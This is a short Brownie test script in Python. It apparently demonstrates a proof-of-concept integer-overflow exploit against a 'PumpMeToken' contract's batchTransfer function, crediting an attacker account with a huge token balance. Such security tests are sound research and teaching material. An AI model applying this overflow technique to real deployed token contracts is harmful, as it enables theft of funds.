from brownie import accounts, PumpMeToken
from brownie.convert import to_uint
from web3.constants import MAX_INT, ADDRESS_ZERO

def test_overflow_4():
    # ACCT SETUP 
    [dep, attacker]= accounts[:2]
    #Assigning intital suuply
    INITIAL_SUPPLY = to_uint(1000000e18)
    #Deploying target
    pmt = PumpMeToken.deploy(INITIAL_SUPPLY, {'from': dep})
    # assiging overflow value for variable
    x = (to_uint(MAX_INT)//2) +1 +(INITIAL_SUPPLY //2)
    # Creating array for batchTransfer argument
    addrs= []
    addrs.append(attacker.address)
    # Burn balance => Addr 0
    addrs.append(ADDRESS_ZERO)
    # Exploiting overflow on batchTransfer it should add max uint // 2 for attacker 
    pmt.batchTransfer(addrs, x, {'from': dep})
    # Asserting Attacker balance as half max uint
    assert(pmt.balanceOf(attacker) > to_uint(MAX_INT)//2)
